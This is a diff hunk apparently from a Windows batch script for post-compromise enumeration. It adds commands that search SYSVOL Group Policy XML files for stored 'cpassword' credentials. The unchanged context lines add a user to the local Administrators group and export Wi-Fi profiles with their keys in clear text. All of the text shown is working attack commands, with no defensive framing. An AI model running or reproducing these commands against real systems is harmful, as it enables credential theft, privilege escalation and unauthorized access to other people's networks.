@@ -328,6 +328,10 @@ tasklist /v
 ECHO ============================
 netstat -an | findstr LISTENING
 ECHO ============================
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+ECHO ============================
+findstr /S cpassword %logonserver%\sysvol\*.xml
+ECHO ============================
 net localgroup "Administrators" rdm /add
 ECHO ============================
 netsh wlan export profile folder=. key=clear
